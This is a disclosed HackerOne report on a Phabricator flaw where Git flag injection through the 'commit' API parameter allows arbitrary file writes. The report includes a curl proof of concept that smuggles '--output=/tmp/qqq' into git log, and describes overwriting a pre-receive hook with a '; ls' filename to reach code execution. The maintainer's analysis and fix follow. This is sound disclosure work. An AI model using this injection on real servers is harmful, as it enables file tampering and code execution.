{"id":1070247,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDcwMjQ3","url":"https://hackerone.com/reports/1070247","title":"Git flag injection leads to arbitrary file write","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2021-01-02T16:03:35.395Z","submitted_at":"2021-01-02T16:03:35.444Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"crownpeanut","url":"/crownpeanut","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":18,"url":"https://hackerone.com/phabricator","handle":"phabricator","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Phabricator","twitter_handle":"phabricator","website":"http://phacility.com/phabricator/","about":"Phabricator is a collection of open source web applications that help software companies build better software."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-07-25T15:13:13.761Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2021-06-25T15:13:12.989Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"keyword : mongoose\n\n#PoC\n1.  Login and generate API token\n2. Create a repo and push several commits to phabricator\n3. Execute diffusion api\n```\ncurl http://dev.localhost/api/diffusion.internal.gitrawdiffquery \\\n    -d api.token=api-token \\\n    -d commit=--output%3D/tmp/qqq \\\n    -d repository=R2\n```\n\n4. `qqq` file will be created in `tmp` directory. And the content of  `qqq` contains the output of git log.\n\n#Description\n`git log` command is used to show git history in phabricator. \nAPI such as diffusion.internal.gitrawdiffquery and [several others](https://sourcegraph.com/search?q=repo:%5Egithub%5C.com/phacility/phabricator%24+%22%27log+%22+-file:test+count:1000\u0026patternType=regexp\u0026case=yes) use git log command to retrieve commit details.\nBecause lack of validation of `commit` parameter, [this line](https://github.com/phacility/phabricator/blob/b2ab18f8f3d0cbab55b92da7a5fcbc0e148a4c99/src/applications/diffusion/conduit/DiffusionInternalGitRawDiffQueryConduitAPIMethod.php#L99:20) will create command below when PoC is executed\n\n```\ngit log -n1 -M -C -B --raw -t 'abbrev=40' --pretty-format: '--output=/tmp/qqq'\n```\n\nThe content of `qqq` after api is executed.\n```\n$ cat /tmp/qqq\n:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      a.c\n```\n\nNotice that `/tmp/qqqq` is controllable path. By specifying the right path it is possible to do arbitrary write.\n\nIf `/var/repo` is owned by `www-data`, attacker could rewrite `pre-receive` hook by commit filename `; ls` which the payload would be like file below.\n\n```\n$ cat /tmp/qqq\n:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      ; ls\n```\n\nThis could be result in RCE when the next time `pre-receive` hook is called.\n\n## Impact\n\nArbitrary file write in phabricator server. Depends on server configuration, it could result in RCE.","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-07-25T15:13:13.143Z","allow_singular_disclosure_after":-6732542.036075645,"singular_disclosure_allowed":true,"vote_count":52,"voters":["obsesif","xploiterr","run_win","mainteemoforfun","hetroublemakr","mirazdevox","3x3s","prinzhorn","khizer47","akashhamal0x01","and 42 more..."],"severity":{"rating":"high","score":8.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"none","integrity":"low","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10314304,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update regarding this issue?","automated_response":false,"created_at":"2021-01-09T07:06:35.772Z","updated_at":"2021-01-09T07:06:35.772Z","actor":{"username":"crownpeanut","cleared":false,"url":"/crownpeanut","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10314312,"is_internal":false,"editable":false,"type":"Activities::HackerRequestedMediation","message":"By reading other reports by other researcher, phabricator has very fast response time (typical 1 day). Could someone from hackerone clarify this report?","automated_response":false,"created_at":"2021-01-09T07:08:11.798Z","updated_at":"2021-01-09T07:08:11.798Z","actor":{"username":"crownpeanut","cleared":false,"url":"/crownpeanut","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10322806,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry for the delay. This appears to be a legitimate security issue that I expect to award you for once I resolve it.\n\n---\n\nI didn't realize this at first, but, for future readers, an important component of this report is that if this file is installed as a Git hook verbatim and has `+x`:\n\n```\n:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      ; ls\n```\n\n...it will execute `ls` when the hook executes. That is, even though this file no interpreter line (like `#!/bin/sh`), and has a long prefix of garbage, it will still execute `ls`:\n\n  - some system default interpreter, presumably `/bin/sh` or `SHELL` or something, will be selected;\n  - it will attempt to evaluate the command `:100644`;\n  - this will fail;\n  - shell script execution continues on failure;\n  - it will then execute `ls`.\n\nThis is *awful*. See also \u003chttps://secure.phabricator.com/book/phabricator/article/exit_codes/\u003e for more on \"Bash is Bad\", perhaps.\n\n---\n\nI believe there is no way to pass the value `--output=...` to `git log \u003cref\u003e` (and possibly other Git commands which accept *both* a ref and a list of paths) safely on the command line (that is, there is no way to `git log` against a branch named `--output=this-is-a-branch-name` by passing the branch name on the CLI). Phabricator already uses `--` to separate the list of paths, but the commit must be specified before `--` and I don't see a way to prevent `git` from interpreting it as a flag.\n\nIn the specific case of `git log`, the commit could be passed via stdin by using `--stdin`. However, this makes invoking `git log` significantly more complex.\n\nSince `--output=...` and similar are not valid Git branch or tag names anyway, we *can* reject values in this form without loss of correctness. I'd strongly prefer to implement a solution which preserves semantics (i.e., I'd prefer Git be called in a way that makes it interpret \"--output\" as a ref name, not a flag) over a solution which rejects \"bad\" arguments, but I don't see a reasonable way to do that here while still passing the argument on the CLI. See also \u003chttps://secure.phabricator.com/T13491\u003e, perhaps.\n\nTo move forward here, I plan to:\n\n  - review calls to `git log` and identify which ones are vulnerable;\n  - review other `git` calls and try to verify that there are no other calls in this form (`git xxx \u003cref\u003e -- \u003cpaths\u003e` or similar).\n\nIdeally, if (a) only `git log` is vulnerable and (b) all existing callsites can reasonably be updated to use `--stdin`, the fix I would most prefer would be to switch to `--stdin`. This also improves behavior in the presence of very large numbers of file paths or very long file paths (see \u003chttps://secure.phabricator.com/T10832\u003e, perhaps, historically), although neither of these cases are particularly important.\n\nIf other commands are vulnerable, and/or not all `git log` calls can easily be updated to use `--stdin`, I may apply a stopgap patch to filter and reject arguments in a \"flag-like\" format, similar to `hgsprintf()`. I'd prefer to avoid this.\n\n---\n\nIn a normally-configured system, I expect `pre-commit` will not be writable by the web process (the daemons install a hook and `chmod 0755` it in `PhabricatorRepositoryPullEngine::installHook()`). Since the attacker is limited in the content they can write and/or their ability to `+x` files, I don't see a *guaranteed* pathway to escalating into RCE in the general case and suspect few systems are vulnerable in practice, but the `pre-commit` attack is straightforward in the case where the web process can write to it.\n\n---\n\nThis may take a bit of time to audit and fix, particularly if I decide to switch all callsites to `--stdin`, but I expect to either have a patch or an update by the end of the week (Jan 15th).","automated_response":false,"created_at":"2021-01-10T23:29:37.367Z","updated_at":"2021-01-10T23:29:57.876Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10380711,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I believe this is now resolved, see:\n\n  - https://secure.phabricator.com/T13589\n  - https://secure.phabricator.com/D21509\n  - https://secure.phabricator.com/D21510\n\nSeveral other Git commands (including `blame` and `diff`) have the same ambiguity in parsing ref selectors that you identified with `log`. Most of the affected commands do not appear to have any way to pass ref selectors unambiguously (that is, no equivalent of `--stdin`), so I ultimately added argument filtering instead (in the form of a new `gitsprintf()` function which rejects selectors which may be interpreted as flags).\n\nLet me know if you catch anything I missed.","automated_response":false,"created_at":"2021-01-15T18:48:01.033Z","updated_at":"2021-01-15T18:48:01.033Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10380760,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"This issue gave attackers access to significant capabilities that they should not have.\n\nThe observation that `git log --raw` output can easily become an executable file in the context of a Git commit hook is particularly surprising and noteworthy.","automated_response":false,"created_at":"2021-01-15T18:51:57.174Z","updated_at":"2021-01-15T18:51:57.174Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Phabricator"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"phabricator","collaborator":{"username":"crownpeanut","url":"/crownpeanut"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10380796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I usually request immediate disclosure once a fix is available upstream, because Phabricator is open source and fixes usually disclose the nature of vulnerabilities, so there is no benefit to waiting on disclosure.\n\nHowever, in this case, the fix covers enough area that I think the specific attack you outline (using `log`, `--output`, and writing to a commit hook) is not obvious, so I'd prefer to wait out the standard disclosure window duration to give installs more opportunity to upgrade.\n\nThanks for the report!","automated_response":false,"created_at":"2021-01-15T18:55:19.553Z","updated_at":"2021-01-15T18:55:19.553Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10385052,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @epriestley \nThanks for the bounty and patch update.\n\nFor the follow up, these are some source code that you might miss\n1. [sink1](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/diffusion/conduit/DiffusionRefsQueryConduitAPIMethod.php#L33)\n2. [sink2](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/diffusion/conduit/DiffusionInternalGitRawDiffQueryConduitAPIMethod.php#L101)\n3. [sink3](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/diffusion/engine/DiffusionCommitHookEngine.php#L613)\n4. [sink4](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/diffusion/query/lowlevel/DiffusionLowLevelCommitQuery.php#L82)\n5. [sink5](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/repository/daemon/PhabricatorGitGraphStream.php#L24)\n6. [sink6](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/repository/engine/PhabricatorRepositoryRefEngine.php#L496)\n7. [sink7](https://github.com/phacility/phabricator/blob/ea9cb0b625fb6922c45aecbfdebacc60788ed92d/src/applications/diffusion/conduit/DiffusionInternalGitRawDiffQueryConduitAPIMethod.php#L109)\n\nFor example, sink1 have the ability to specify output path but unable to control file content, sink2 still has ability to  write arbitrary path with arbitrary content, etc.\nSince I just grep the source code, I'm not sure if it is really exploitable or what kind of impact it might has.\nMaybe you might want to look at those? :D","automated_response":false,"created_at":"2021-01-16T02:34:47.124Z","updated_at":"2021-01-16T02:39:07.649Z","actor":{"username":"crownpeanut","cleared":false,"url":"/crownpeanut","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10428587,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!\n\nI caught one more `git diff-tree` in [LowLevelFilesizeQuery:35](https://secure.phabricator.com/source/phabricator/browse/master/src/applications/diffusion/query/lowlevel/DiffusionLowLevelFilesizeQuery.php$35), too.\n\nI think these should be fixed by \u003chttps://secure.phabricator.com/D21511\u003e.","automated_response":false,"created_at":"2021-01-20T20:08:55.047Z","updated_at":"2021-01-20T20:08:55.047Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12243553,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think this issue has been fixed quiet a long time ago. Could you please disclose this issue? @epristley","automated_response":false,"created_at":"2021-06-25T11:04:35.502Z","updated_at":"2021-06-25T11:04:35.502Z","actor":{"username":"crownpeanut","cleared":false,"url":"/crownpeanut","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12247737,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Sure. I think there were a handful of followup actions I wanted to take, but I can track them on my side.","automated_response":false,"created_at":"2021-06-25T15:13:07.222Z","updated_at":"2021-06-25T15:13:07.222Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"crownpeanut","url":"/crownpeanut"},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12247739,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-25T15:13:13.027Z","updated_at":"2021-06-25T15:13:13.027Z","first_to_agree":true,"actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12667490,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-07-25T15:13:13.820Z","updated_at":"2021-07-25T15:13:13.820Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Phabricator"}},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}